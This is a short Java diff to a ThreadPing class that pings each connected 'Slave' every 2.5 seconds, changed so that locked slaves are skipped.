@@ -15,7 +15,10 @@ public class ThreadPing extends Thread {
 			try {
 				for (int i = 0; i < Main.connections.size(); i++) {
 					Slave slave = Main.connections.get(i);
-					slave.ping();
+				
+					if (!slave.isLocked()) {
+						slave.ping();
+					}
 				}
 				Thread.sleep(2500L);
 			} catch (Exception ex) {
